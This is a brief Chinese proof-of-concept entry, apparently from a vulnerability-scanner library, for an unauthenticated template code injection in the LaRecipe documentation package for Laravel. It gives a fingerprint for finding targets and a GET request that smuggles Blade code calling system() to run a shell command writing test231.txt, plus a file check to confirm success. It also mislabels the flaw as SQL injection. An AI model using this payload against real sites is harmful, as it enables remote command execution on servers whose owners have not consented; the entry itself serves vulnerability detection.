# LaravelLaReciperenderBlade末授权代码注入漏洞

LaravelLaReciperenderBlade ｜ SQL注入 ｜ —
- **指纹**：`body="LaRecipe"`
- **请求**：`GET /docs/1.0/?{{system('echo${IFS}test231>test231.txt')}} HTTP/1.1`

**Payload**
```
文件定位：/test231.txt
```
- **响应特征**：200